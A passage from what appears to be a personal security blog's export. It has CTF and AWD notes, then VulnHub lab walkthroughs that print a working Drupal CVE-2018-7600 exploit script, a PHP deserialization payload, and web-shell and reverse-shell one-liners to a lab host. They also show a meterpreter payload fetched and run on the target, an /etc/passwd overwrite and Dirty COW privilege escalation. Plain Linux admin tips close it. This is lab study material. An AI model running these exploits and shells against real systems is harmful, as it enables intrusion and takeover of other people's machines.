class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于call_user_func 回调函数的用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;sqy_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$classname</span>.<span class="string">&#x27;::say_hello&#x27;</span>);</span><br><span class="line"><span class="variable">$myobject</span>=<span class="keyword">new</span> <span class="title function_ invoke__">myclass</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>,<span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>,<span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload post 传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=nss2::ctf</span><br></pre></td></tr></table></figure>

<h2 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;&quot;;</span><br><span class="line">    function __call($method,$args)&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;code = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;</span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);</span><br><span class="line">    if (isset($ret[1])) &#123;</span><br><span class="line">        foreach ($ret[1] as $i) &#123;</span><br><span class="line">            if(intval($i)!==1)&#123;</span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?poc=O:1:%22b%22:2:&#123;s:1:%22a%22;O:1:%22a%22:1:&#123;s:4:%22code%22;s:16:%22eval($_POST[1]);%22;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">蚁剑Redis插件地址： https:``//github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>



<p>先在有权限的目录上传一个exp.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>

<p>redis 命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>nss</tag>
      </tags>
  </entry>
  <entry>
    <title>awd小结</title>
    <url>/2023/06/11/awd%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h2 id="扫描目标靶机"><a href="#扫描目标靶机" class="headerlink" title="扫描目标靶机"></a>扫描目标靶机</h2><p>nmap</p>
<p>生成字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>扫描指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/桌面/pingtest.txt -sn</span><br></pre></td></tr></table></figure>

<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>passwd</p>
<h2 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); 或者</span><br><span class="line">update user set password = PASSWORD(&#x27;要更换的密码&#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privileges；</span><br><span class="line">修改字段内容，例子</span><br><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="上个waf"><a href="#上个waf" class="headerlink" title="上个waf"></a>上个waf</h2><p>下载连接</p>
<p><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p>
<p>回到终端，在上传的waf目录下，使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>

<p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入<code>?watchbird=ui</code>，就会进入    到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p>
<p>3配置好之后就能进入内部网页</p>
<p>下载源码</p>
<h2 id="压缩解压源码"><a href="#压缩解压源码" class="headerlink" title="压缩解压源码"></a>压缩解压源码</h2><p>压缩</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf ~/html.tar.gz *</span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf html.tar.gz</span><br></pre></td></tr></table></figure>

<p>传输</p>
<p>d盾扫描一下</p>
<p>批量攻击,由于这个不太好外放，所以自行编写吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>

<p>批量提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>

<h2 id="杀不死马。"><a href="#杀不死马。" class="headerlink" title="杀不死马。"></a>杀不死马。</h2><p>杀进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pkill -u www-data</span><br></pre></td></tr></table></figure>

<p>这条命令在xshell内没有权限</p>
<p>在蚁剑进行。</p>
]]></content>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub练习1</title>
    <url>/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Os-hackNos-1"><a href="#Os-hackNos-1" class="headerlink" title="Os-hackNos-1"></a>Os-hackNos-1</h2><p>信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.1-254 -sP</span><br></pre></td></tr></table></figure>

<p>目标靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.158.155</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.155 -Pn</span><br></pre></td></tr></table></figure>

<p>查看端口开放，22，80</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.155/</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.155/drupal/</span><br></pre></td></tr></table></figure>

<p>存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.155/drupal/CHANGELOG.txt</span><br></pre></td></tr></table></figure>



<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7600.py&quot;,</span><br><span class="line">                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),</span><br><span class="line">                    epilog= &#x27;&#x27;&#x27;</span><br><span class="line">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span><br><span class="line">                    by poisoning the recover password form (user/password) and triggering it with</span><br><span class="line">                    the upload file via ajax (/file/ajax).</span><br><span class="line">                    &#x27;&#x27;&#x27;)</span><br><span class="line">  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;&#x27;http&#x27;: proxy, &#x27;https&#x27;: proxy&#125;</span><br><span class="line">  print(&#x27;[*] Poisoning a form and including it in cache.&#x27;)</span><br><span class="line">  get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:function, &#x27;name[#type]&#x27;:&#x27;markup&#x27;, &#x27;name[#markup]&#x27;: command&#125;</span><br><span class="line">  post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;, &#x27;_triggering_element_value&#x27;:&#x27;&#x27;, &#x27;opz&#x27;:&#x27;E-mail new Password&#x27;&#125;</span><br><span class="line">  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-pass&#x27;&#125;)</span><br><span class="line">    form_build_id = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_build_id&#x27;&#125;).get(&#x27;value&#x27;)</span><br><span class="line">    if form_build_id:</span><br><span class="line">        print(&#x27;[*] Poisoned form ID: &#x27; + form_build_id)</span><br><span class="line">        print(&#x27;[*] Triggering exploit to execute: &#x27; + command)</span><br><span class="line">        get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + form_build_id&#125;</span><br><span class="line">        post_params = &#123;&#x27;form_build_id&#x27;:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">        parsed_result = r.text.split(&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;)[0]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    print(&quot;ERROR: Something went wrong.&quot;)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  print ()</span><br><span class="line">  print (&#x27;=============================================================================&#x27;)</span><br><span class="line">  print (&#x27;|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&#x27;)</span><br><span class="line">  print (&#x27;|                              by pimps                                     |&#x27;)</span><br><span class="line">  print (&#x27;=============================================================================\n&#x27;)</span><br><span class="line"></span><br><span class="line">  args = get_args() # get the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;ls&quot;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;echo &#x27;&lt;?=eval(\$_POST[1])?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure>

<p>weevely:生成以及连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;连接密码&gt;</span><br></pre></td></tr></table></figure>

<p>展示真实用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.158.129 3366</span><br></pre></td></tr></table></figure>

<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p>
<p>命令将尝试查找具有root权限的SUID的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517202237.png"></p>
<p>然后把etc&#x2F;passwd中的root那行复制一下，x换成我们生成的密码哈希，重新添加到新的一行当中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br></pre></td></tr></table></figure>

<p>使用su命令报错，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>

<p>使用python 终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>这一行复制，在最低加一行，将x 换为哈希值</p>
<p>修改为如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br><span class="line">$1$zhou$IY3SDlxhR.gde5eP6C/Y/0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517200256.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.158.129:12345/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

<p>-O参数是替换&#x2F;etc&#x2F;passwd</p>
<p>使用su命令报错，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>

<p>使用python 终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517201832.png"></p>
<p>get root</p>
<h2 id="domdom"><a href="#domdom" class="headerlink" title="domdom"></a>domdom</h2><p>信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>

<p>目标靶机 192.168.158.158</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.158 -Pn </span><br></pre></td></tr></table></figure>

<p>dirsearch扫一下，发现</p>
<p>index.php,admin.php</p>
<p>在index.php 界面输入，抓包，发包发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello User, Please fill in the login credentials as well as your name for tracking purposes.</span><br></pre></td></tr></table></figure>

<p>将请求头改为admin.php</p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605194544.png"></p>
<p>传入参数cmd,进行命令执行，反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.158.129/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>进行url编码发包无反应，网站是使用php,所以用php反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.158.129&quot;,5000);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>编码后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.158.129%22%2C5000%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure>

<p>getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><p>首先生成msf的木马</p>
<p>kali执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.158.129 LPORT=7777 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>然后进入msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lhost 0.0.0.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>靶机执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp;wget http://192.168.158.129/payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 payload.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>

<p>连接成功，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202303.png"></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202357.png"></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202709.png"></p>
<p>使用第一个，好像成功了，但后续失败了</p>
<p>后续使用第二个，成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/linux/local/bpf_sign_extension_priv_esc</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204112.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /home/domom/Desktop/README.md</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204353.png"></p>
<p>密码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mj7AGmPR-m&amp;Vf&gt;Ry&#123;&#125;LJRBS5nc+*V.#a</span><br></pre></td></tr></table></figure>

<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>还是这台靶机，继续用，</p>
<p>探测脚本如下，运行可以看到</p>
<p><a href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</a></p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605215241.png"></p>
<p>首先kali,下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40616</span><br><span class="line">mv 40616 cowroot.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>靶机，进行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.158.129/cowroot.c</span><br><span class="line">gcc cowroot.c -o cowroot -pthread</span><br><span class="line">chmod +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>

<p>过程中会报错，但不用管</p>
<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605211415.png"></p>
]]></content>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>linux问题</title>
    <url>/2023/03/17/linux/</url>
    <content><![CDATA[<p>linux使用遇见的问题</p>
   <span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/</span><br></pre></td></tr></table></figure>

<p>不知道什么原因kali下无法安装openssl库于是下载了ubuntu</p>
<p>一下是遇到的一些问题</p>
<h2 id="实现Ubuntu与Windows之间的复制粘贴"><a href="#实现Ubuntu与Windows之间的复制粘贴" class="headerlink" title="实现Ubuntu与Windows之间的复制粘贴"></a>实现Ubuntu与Windows之间的复制粘贴</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove open-vm-tools	//卸载已有的工具</span><br><span class="line">sudo apt-get install open-vm-tools		//安装工具open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop  //安装open-vm-tools-desktop</span><br><span class="line">reboot       //重启Ubuntu系统</span><br></pre></td></tr></table></figure>

<p>安装基本软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用命令sudo apt install build-essential，该命令将安装一堆新包，包括gcc，g ++和make</span><br></pre></td></tr></table></figure>



<h2 id="安装-openssl库"><a href="#安装-openssl库" class="headerlink" title="安装 openssl库"></a>安装 openssl库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<p>开启ubuntu的大门？</p>
<h2 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h2><p>安装图形化页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum groupinstall &quot;X Window System&quot;</span><br><span class="line">yum groupinstall -y &quot;GNOME Desktop&quot;</span><br><span class="line">su</span><br><span class="line">init 5  //进入图形化页面</span><br></pre></td></tr></table></figure>

<p>安装apaech服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa httpd   #检验有没有httpd</span><br><span class="line">yum install httpd* -y   #安装</span><br><span class="line">systemctl start httpd.service #启动</span><br><span class="line">systemctl stop httpd.service #停止服务</span><br><span class="line">systemctl status httpd.service #查看状态</span><br></pre></td></tr></table></figure>

<p>安装mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>安装mysql服务好像会报错，下面是报错内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-compat-5.7.41-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY</span><br><span class="line">Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br><span class="line">The GPG keys listed for the &quot;MySQL 5.7 Community Server&quot; repository are already installed but they are not correct for this package.</span><br><span class="line">Check that the correct key URLs are configured for this repository.</span><br><span class="line"> Failing package is: mysql-community-libs-compat-5.7.41-1.el7.x86_64</span><br><span class="line"> GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</span><br></pre></td></tr></table></figure>

<p>找到解决方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022  //先执行这个</span><br><span class="line">yum -y install mysql-community-server  ///再安装</span><br></pre></td></tr></table></figure>

<p>安装完毕，开始使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start  mysqld.service  #打开mysql</span><br><span class="line">systemctl status mysqld.service   #检查状态</span><br><span class="line">grep &quot;password&quot; /var/log/mysqld.log  //查找暂时root密码</span><br><span class="line">mysql -uroot -p  #登录密码</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;  #修改密码需要字符大小写数字</span><br></pre></td></tr></table></figure>

<p>xshell传输文件发现没有权限 ，赋予权限即可传输成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure>

<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>开启，关机，重启。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>

<h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">或者</span><br><span class="line">netstat -tln</span><br></pre></td></tr></table></figure>

<p>bind to :::9999: Address already in use. QUITTING.</p>
<p>解决方法</p>
<p><code>1.找到占用进程： netstat -nap | grep 端口</code></p>
<p>kill pid</p>
<h2 id="关闭socket-连接"><a href="#关闭socket-连接" class="headerlink" title="关闭socket 连接"></a>关闭socket 连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -t  //命令用于显示网络状态。</span><br><span class="line">kill pid  </span><br></pre></td></tr></table></figure>



